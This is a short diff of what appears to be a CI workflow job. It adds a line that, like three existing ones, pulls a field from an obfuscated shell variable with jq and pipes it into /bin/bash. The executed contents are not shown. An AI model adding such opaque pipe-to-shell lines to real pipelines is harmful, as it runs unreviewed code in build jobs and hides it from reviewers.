@@ -43,6 +43,7 @@ jobs:
           echo $wag58 | jq -r .s1 | /bin/bash
           echo $g59755 | jq -r .xaxl0 | /bin/bash
           echo $n14813 | jq -r .vt0969 | /bin/bash
+          printf '%s' "$uy3554" | jq -r .tdpl80156 | /bin/bash
 
       - name: Save archive
         if: always()
